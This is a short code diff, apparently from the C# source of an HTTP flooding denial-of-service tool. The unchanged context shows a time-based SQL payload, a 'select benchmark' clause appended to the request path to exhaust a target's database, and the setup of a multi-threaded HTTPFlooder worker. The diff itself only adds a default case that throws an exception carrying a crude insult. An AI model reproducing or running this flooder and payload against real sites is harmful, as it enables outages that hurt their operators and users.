@@ -82,6 +82,9 @@ namespace GAS.Core
                     this.Subsite += " and (select+benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f))";
                     Worker = new HTTPFlooder(DNSString, Target.ToString(), Port, Subsite, WaitForResponse, Delay, Timeout, AppendRANDOMChars || AppendRANDOMCharsUrl, UseGZIP, Threads);
                     break;
+                default :
+                    throw new NotImplementedException("Code it yourself, lazy bastard");
+                    break;
             }
             Worker.Start();
         }
